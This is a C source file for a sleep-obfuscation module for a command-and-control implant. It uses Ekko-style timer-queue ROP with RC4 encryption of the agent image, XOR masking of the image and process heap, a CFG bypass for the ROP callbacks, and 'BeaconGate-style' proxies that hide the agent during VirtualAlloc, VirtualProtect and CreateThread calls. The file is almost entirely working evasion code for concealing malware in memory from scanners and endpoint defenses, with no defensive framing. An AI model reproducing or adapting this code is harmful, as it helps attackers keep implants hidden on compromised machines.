#include <windows.h>
#include "pic_defs.h"
#include "user_data.h"
#include "cfg_bypass.h"

/* ──────────────────────────────────────────────────────────────────────
 * UDRL Sleep Mask - Standalone PIC sleep obfuscation
 *
 * Provides three masking strategies:
 *   - Ekko:       Timer queue ROP + RC4 (x64 only)
 *   - Full Image: XOR with skip region + VirtualProtect cycling
 *   - Heap:       HeapWalk + XOR of process heap blocks
 *
 * Integrates:
 *   - CFG bypass for Ekko timer callbacks
 *   - BeaconGate-style API proxying through the mask context
 *   - User data awareness for module stomping vs VirtualAlloc
 *
 * Configuration (compile-time):
 *   MASK_TYPE   = MASK_EKKO | MASK_FULL_IMAGE | MASK_HEAP
 *   ENABLE_CFG  = 0 | 1
 *   ENABLE_HEAP = 0 | 1
 *
 * The mask receives the UDRL_USER_DATA pointer from the agent. The
 * agent calls mask_sleep() when it wants to sleep, passing the user
 * data and sleep duration.
 * ────────────────────────────────────────────────────────────────────── */

/* ── Configuration ── */

#define MASK_EKKO         0
#define MASK_FULL_IMAGE   1
#define MASK_HEAP         2

#ifndef MASK_TYPE
#define MASK_TYPE  MASK_EKKO
#endif

#ifndef ENABLE_CFG
#define ENABLE_CFG   1
#endif

#ifndef ENABLE_HEAP
#define ENABLE_HEAP  1
#endif

/* ── Forward declarations ── */

static void PICFN xor_regions(UDRL_USER_DATA *ud);
static void PICFN xor_heap_blocks(void);
static void PICFN ekko_sleep(UDRL_USER_DATA *ud, DWORD time_ms);
static void PICFN full_image_sleep(UDRL_USER_DATA *ud, DWORD time_ms);

/* ── XOR masking helpers ── */

static void PICFN xor_regions(UDRL_USER_DATA *ud) {
    for (DWORD r = 0; r < ud->region_count; r++) {
        BYTE *base = (BYTE *)ud->regions[r].base;
        DWORD size = ud->regions[r].size;
        BYTE *key  = ud->rc4_key;

        for (DWORD i = 0; i < size; i++) {
            base[i] ^= key[i % 16];
        }
    }
}

static void PICFN xor_region_with_skip(
    UDRL_USER_DATA *ud, DWORD region_idx,
    PVOID skip_base, DWORD skip_size
) {
    if (region_idx >= ud->region_count)
        return;

    BYTE *base = (BYTE *)ud->regions[region_idx].base;
    DWORD size = ud->regions[region_idx].size;
    BYTE *key  = ud->rc4_key;
    uintptr_t skip_start = (uintptr_t)skip_base;
    uintptr_t skip_end   = skip_start + skip_size;

    for (DWORD i = 0; i < size; i++) {
        uintptr_t addr = (uintptr_t)(base + i);
        if (skip_base && addr >= skip_start && addr < skip_end)
            continue;
        base[i] ^= key[i % 16];
    }
}

/* ── Heap masking ── */

#if ENABLE_HEAP
static void PICFN xor_heap_blocks(void) {
    PVOID hKernel32 = resolve_module(fnv1a_hash_w(L"kernel32.dll"));
    if (!hKernel32) return;

    fnGetProcessHeap pGetProcessHeap = (fnGetProcessHeap)resolve_api(
        hKernel32, fnv1a_hash_a("GetProcessHeap"));
    fnHeapWalk pHeapWalk = (fnHeapWalk)resolve_api(
        hKernel32, fnv1a_hash_a("HeapWalk"));

    if (!pGetProcessHeap || !pHeapWalk)
        return;

    HANDLE hHeap = pGetProcessHeap();
    PROCESS_HEAP_ENTRY entry;
    pic_memset(&entry, 0, sizeof(entry));

    BYTE xor_key[16] = {
        0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
        0x13, 0x37, 0x42, 0x42, 0xFE, 0xED, 0xFA, 0xCE
    };

    while (pHeapWalk(hHeap, &entry)) {
        if (entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) {
            if (entry.cbData >= 16) {
                BYTE *data = (BYTE *)entry.lpData;
                for (DWORD i = 0; i < entry.cbData; i++) {
                    data[i] ^= xor_key[i % 16];
                }
            }
        }
    }
}
#endif

/* ── Ekko sleep (x64 only) ── */

#ifdef _WIN64
static void PICFN ekko_sleep(UDRL_USER_DATA *ud, DWORD time_ms) {
    PVOID hKernel32 = resolve_module(fnv1a_hash_w(L"kernel32.dll"));
    PVOID hNtdll    = resolve_module(fnv1a_hash_w(L"ntdll.dll"));

    if (!hKernel32 || !hNtdll)
        return;

    /* Resolve APIs */
    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)resolve_api(
        hKernel32, fnv1a_hash_a("VirtualProtect"));
    fnCreateEventW pCreateEventW = (fnCreateEventW)resolve_api(
        hKernel32, fnv1a_hash_a("CreateEventW"));
    fnCreateTimerQueue pCreateTimerQueue = (fnCreateTimerQueue)resolve_api(
        hKernel32, fnv1a_hash_a("CreateTimerQueue"));
    fnCreateTimerQueueTimer pCreateTimerQueueTimer = (fnCreateTimerQueueTimer)resolve_api(
        hKernel32, fnv1a_hash_a("CreateTimerQueueTimer"));
    fnDeleteTimerQueue pDeleteTimerQueue = (fnDeleteTimerQueue)resolve_api(
        hKernel32, fnv1a_hash_a("DeleteTimerQueue"));
    fnWaitForSingleObject pWaitForSingleObject = (fnWaitForSingleObject)resolve_api(
        hKernel32, fnv1a_hash_a("WaitForSingleObject"));
    fnSetEvent pSetEvent = (fnSetEvent)resolve_api(
        hKernel32, fnv1a_hash_a("SetEvent"));
    fnCloseHandle pCloseHandle = (fnCloseHandle)resolve_api(
        hKernel32, fnv1a_hash_a("CloseHandle"));

    fnNtContinue pNtContinue = (fnNtContinue)resolve_api(
        hNtdll, fnv1a_hash_a("NtContinue"));
    fnRtlCaptureContext pRtlCaptureContext = (fnRtlCaptureContext)resolve_api(
        hNtdll, fnv1a_hash_a("RtlCaptureContext"));
    fnSystemFunction032 pSystemFunction032 = (fnSystemFunction032)resolve_api(
        hNtdll, fnv1a_hash_a("SystemFunction032"));

    if (!pVirtualProtect || !pCreateEventW || !pCreateTimerQueue ||
        !pCreateTimerQueueTimer || !pDeleteTimerQueue || !pWaitForSingleObject ||
        !pSetEvent || !pCloseHandle || !pNtContinue || !pRtlCaptureContext ||
        !pSystemFunction032)
        return;

    /* CFG bypass: register NtContinue and RtlCaptureContext as valid targets */
#if ENABLE_CFG
    cfg_register_ekko_targets(hKernel32, hNtdll);
#endif

    /* Setup sync primitives */
    HANDLE hEvent = pCreateEventW(NULL, FALSE, FALSE, NULL);
    HANDLE hTimerQueue = pCreateTimerQueue();

    if (!hEvent || !hTimerQueue) {
        if (hEvent) pCloseHandle(hEvent);
        if (hTimerQueue) pDeleteTimerQueue(hTimerQueue);
        return;
    }

    /* Capture initial context via timer callback for clean stack */
    CONTEXT ctx_capture;
    pic_memset(&ctx_capture, 0, sizeof(ctx_capture));

    HANDLE hNewTimer = NULL;
    pCreateTimerQueueTimer(&hNewTimer, hTimerQueue,
        (WAITORTIMERCALLBACK)pRtlCaptureContext, &ctx_capture,
        0, 0, WT_EXECUTEINTIMERTHREAD);

    /* Brief wait for context capture */
    pWaitForSingleObject(hEvent, 50);

    /* Image region from user data */
    PVOID  image_base = ud->agent_base;
    DWORD  image_size = ud->agent_size;
    DWORD  old_protect = 0;

    /* RC4 key/data descriptors for SystemFunction032 */
    USTRING key_str;
    USTRING img_str;

    key_str.Buffer        = ud->rc4_key;
    key_str.Length         = 16;
    key_str.MaximumLength  = 16;

    img_str.Buffer        = image_base;
    img_str.Length         = image_size;
    img_str.MaximumLength  = image_size;

    /* Build ROP chain contexts */
    CONTEXT ctx_prot_rw, ctx_encrypt, ctx_decrypt, ctx_prot_rx, ctx_signal;

    /* 1. VirtualProtect(image_base, image_size, PAGE_READWRITE, &old_protect) */
    pic_memcpy(&ctx_prot_rw, &ctx_capture, sizeof(CONTEXT));
    ctx_prot_rw.Rsp -= 8;
    ctx_prot_rw.Rip  = (DWORD64)pVirtualProtect;
    ctx_prot_rw.Rcx  = (DWORD64)image_base;
    ctx_prot_rw.Rdx  = (DWORD64)image_size;
    ctx_prot_rw.R8   = PAGE_READWRITE;
    ctx_prot_rw.R9   = (DWORD64)&old_protect;

    /* 2. SystemFunction032(&img_str, &key_str) - encrypt */
    pic_memcpy(&ctx_encrypt, &ctx_capture, sizeof(CONTEXT));
    ctx_encrypt.Rsp -= 8;
    ctx_encrypt.Rip  = (DWORD64)pSystemFunction032;
    ctx_encrypt.Rcx  = (DWORD64)&img_str;
    ctx_encrypt.Rdx  = (DWORD64)&key_str;

    /* 3. SystemFunction032(&img_str, &key_str) - decrypt (RC4 is symmetric) */
    pic_memcpy(&ctx_decrypt, &ctx_capture, sizeof(CONTEXT));
    ctx_decrypt.Rsp -= 8;
    ctx_decrypt.Rip  = (DWORD64)pSystemFunction032;
    ctx_decrypt.Rcx  = (DWORD64)&img_str;
    ctx_decrypt.Rdx  = (DWORD64)&key_str;

    /* 4. VirtualProtect(image_base, image_size, PAGE_EXECUTE_READ, &old_protect) */
    pic_memcpy(&ctx_prot_rx, &ctx_capture, sizeof(CONTEXT));
    ctx_prot_rx.Rsp -= 8;
    ctx_prot_rx.Rip  = (DWORD64)pVirtualProtect;
    ctx_prot_rx.Rcx  = (DWORD64)image_base;
    ctx_prot_rx.Rdx  = (DWORD64)image_size;
    ctx_prot_rx.R8   = PAGE_EXECUTE_READ;
    ctx_prot_rx.R9   = (DWORD64)&old_protect;

    /* 5. SetEvent(hEvent) - signal completion */
    pic_memcpy(&ctx_signal, &ctx_capture, sizeof(CONTEXT));
    ctx_signal.Rsp -= 8;
    ctx_signal.Rip  = (DWORD64)pSetEvent;
    ctx_signal.Rcx  = (DWORD64)hEvent;

    /* Queue the ROP chain with staggered timers */
    DWORD base_time = 100;

    pCreateTimerQueueTimer(&hNewTimer, hTimerQueue,
        (WAITORTIMERCALLBACK)pNtContinue, &ctx_prot_rw,
        base_time, 0, WT_EXECUTEINTIMERTHREAD);

    pCreateTimerQueueTimer(&hNewTimer, hTimerQueue,
        (WAITORTIMERCALLBACK)pNtContinue, &ctx_encrypt,
        base_time + 200, 0, WT_EXECUTEINTIMERTHREAD);

    /* Sleep gap: decrypt fires after sleep duration */
    pCreateTimerQueueTimer(&hNewTimer, hTimerQueue,
        (WAITORTIMERCALLBACK)pNtContinue, &ctx_decrypt,
        base_time + 200 + time_ms, 0, WT_EXECUTEINTIMERTHREAD);

    pCreateTimerQueueTimer(&hNewTimer, hTimerQueue,
        (WAITORTIMERCALLBACK)pNtContinue, &ctx_prot_rx,
        base_time + 400 + time_ms, 0, WT_EXECUTEINTIMERTHREAD);

    pCreateTimerQueueTimer(&hNewTimer, hTimerQueue,
        (WAITORTIMERCALLBACK)pNtContinue, &ctx_signal,
        base_time + 600 + time_ms, 0, WT_EXECUTEINTIMERTHREAD);

    /* Mask heap before blocking */
#if ENABLE_HEAP
    xor_heap_blocks();
#endif

    /* Block until ROP chain completes */
    pWaitForSingleObject(hEvent, INFINITE);

    /* Unmask heap after waking */
#if ENABLE_HEAP
    xor_heap_blocks();
#endif

    /* Cleanup */
    pCloseHandle(hEvent);
    pDeleteTimerQueue(hTimerQueue);
}
#endif /* _WIN64 */

/* ── Full image XOR sleep (fallback / x86 compatible) ── */

static void PICFN full_image_sleep(UDRL_USER_DATA *ud, DWORD time_ms) {
    PVOID hKernel32 = resolve_module(fnv1a_hash_w(L"kernel32.dll"));
    PVOID hNtdll    = resolve_module(fnv1a_hash_w(L"ntdll.dll"));

    if (!hKernel32 || !hNtdll)
        return;

    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)resolve_api(
        hKernel32, fnv1a_hash_a("VirtualProtect"));
    fnNtDelayExecution pNtDelayExecution = (fnNtDelayExecution)resolve_api(
        hNtdll, fnv1a_hash_a("NtDelayExecution"));

    if (!pVirtualProtect || !pNtDelayExecution)
        return;

    /* Flip to RW */
    DWORD old_protect = 0;
    pVirtualProtect(ud->agent_base, ud->agent_size, PAGE_READWRITE, &old_protect);

    /* XOR the image, skipping our own code region */
    xor_region_with_skip(ud, 0, (PVOID)&full_image_sleep, 0x200);

#if ENABLE_HEAP
    xor_heap_blocks();
#endif

    /* Sleep */
    LARGE_INTEGER delay;
    delay.QuadPart = -((LONGLONG)time_ms * 10000);
    pNtDelayExecution(FALSE, &delay);

    /* Unmask */
#if ENABLE_HEAP
    xor_heap_blocks();
#endif

    xor_region_with_skip(ud, 0, (PVOID)&full_image_sleep, 0x200);

    /* Flip back to original protection */
    pVirtualProtect(ud->agent_base, ud->agent_size, old_protect, &old_protect);
}

/* ──────────────────────────────────────────────────────────────────────
 * mask_sleep - Public entry point called by the agent
 *
 * The agent passes its UDRL_USER_DATA pointer (received from the
 * loader via lpvReserved in DllMain) and the desired sleep time.
 *
 * Dispatches to the configured mask type.
 * ────────────────────────────────────────────────────────────────────── */

void PICFN mask_sleep(UDRL_USER_DATA *ud, DWORD time_ms) {
    if (!ud || ud->magic != UDRL_MAGIC)
        return;

    if (ud->region_count == 0)
        return;

#if MASK_TYPE == MASK_EKKO
#ifdef _WIN64
    ekko_sleep(ud, time_ms);
#else
    /* x86 fallback to full image XOR */
    full_image_sleep(ud, time_ms);
#endif
#elif MASK_TYPE == MASK_FULL_IMAGE
    full_image_sleep(ud, time_ms);
#elif MASK_TYPE == MASK_HEAP
    /* Heap-only mode: just mask heap + plain sleep */
    {
        PVOID hNtdll = resolve_module(fnv1a_hash_w(L"ntdll.dll"));
        if (!hNtdll) return;
        fnNtDelayExecution pNtDelayExecution = (fnNtDelayExecution)resolve_api(
            hNtdll, fnv1a_hash_a("NtDelayExecution"));
        if (!pNtDelayExecution) return;

#if ENABLE_HEAP
        xor_heap_blocks();
#endif
        LARGE_INTEGER delay;
        delay.QuadPart = -((LONGLONG)time_ms * 10000);
        pNtDelayExecution(FALSE, &delay);
#if ENABLE_HEAP
        xor_heap_blocks();
#endif
    }
#endif
}

/* ──────────────────────────────────────────────────────────────────────
 * BeaconGate-style API proxy
 *
 * Proxies sensitive API calls through the sleep mask context so the
 * agent is obfuscated during API execution. The agent calls these
 * proxy functions instead of directly calling the WinAPI.
 *
 * Each proxy:
 *   1. Masks the agent image (XOR)
 *   2. Calls the real API
 *   3. Unmasks the agent image
 *
 * Only the proxy stub code (which lives in a separate region or
 * on the stack) is visible during the API call.
 * ────────────────────────────────────────────────────────────────────── */

LPVOID PICFN gate_VirtualAlloc(
    UDRL_USER_DATA *ud,
    LPVOID lpAddress, SIZE_T dwSize,
    DWORD flAllocationType, DWORD flProtect
) {
    PVOID hKernel32 = resolve_module(fnv1a_hash_w(L"kernel32.dll"));
    if (!hKernel32) return NULL;

    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)resolve_api(
        hKernel32, fnv1a_hash_a("VirtualAlloc"));
    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)resolve_api(
        hKernel32, fnv1a_hash_a("VirtualProtect"));

    if (!pVirtualAlloc) return NULL;

    /* Mask agent during the call */
    DWORD old = 0;
    if (pVirtualProtect && ud && ud->magic == UDRL_MAGIC) {
        pVirtualProtect(ud->agent_base, ud->agent_size, PAGE_READWRITE, &old);
        xor_regions(ud);
    }

    LPVOID result = pVirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);

    /* Unmask */
    if (pVirtualProtect && ud && ud->magic == UDRL_MAGIC) {
        xor_regions(ud);
        pVirtualProtect(ud->agent_base, ud->agent_size, old, &old);
    }

    return result;
}

BOOL PICFN gate_VirtualProtect(
    UDRL_USER_DATA *ud,
    LPVOID lpAddress, SIZE_T dwSize,
    DWORD flNewProtect, PDWORD lpflOldProtect
) {
    PVOID hKernel32 = resolve_module(fnv1a_hash_w(L"kernel32.dll"));
    if (!hKernel32) return FALSE;

    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)resolve_api(
        hKernel32, fnv1a_hash_a("VirtualProtect"));
    if (!pVirtualProtect) return FALSE;

    DWORD old = 0;
    if (ud && ud->magic == UDRL_MAGIC) {
        pVirtualProtect(ud->agent_base, ud->agent_size, PAGE_READWRITE, &old);
        xor_regions(ud);
    }

    BOOL result = pVirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);

    if (ud && ud->magic == UDRL_MAGIC) {
        xor_regions(ud);
        pVirtualProtect(ud->agent_base, ud->agent_size, old, &old);
    }

    return result;
}

HANDLE PICFN gate_CreateThread(
    UDRL_USER_DATA *ud,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
) {
    PVOID hKernel32 = resolve_module(fnv1a_hash_w(L"kernel32.dll"));
    if (!hKernel32) return NULL;

    fnCreateThread pCreateThread = (fnCreateThread)resolve_api(
        hKernel32, fnv1a_hash_a("CreateThread"));
    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)resolve_api(
        hKernel32, fnv1a_hash_a("VirtualProtect"));

    if (!pCreateThread) return NULL;

    DWORD old = 0;
    if (pVirtualProtect && ud && ud->magic == UDRL_MAGIC) {
        pVirtualProtect(ud->agent_base, ud->agent_size, PAGE_READWRITE, &old);
        xor_regions(ud);
    }

    HANDLE result = pCreateThread(
        lpThreadAttributes, dwStackSize, lpStartAddress,
        lpParameter, dwCreationFlags, lpThreadId);

    if (pVirtualProtect && ud && ud->magic == UDRL_MAGIC) {
        xor_regions(ud);
        pVirtualProtect(ud->agent_base, ud->agent_size, old, &old);
    }

    return result;
}
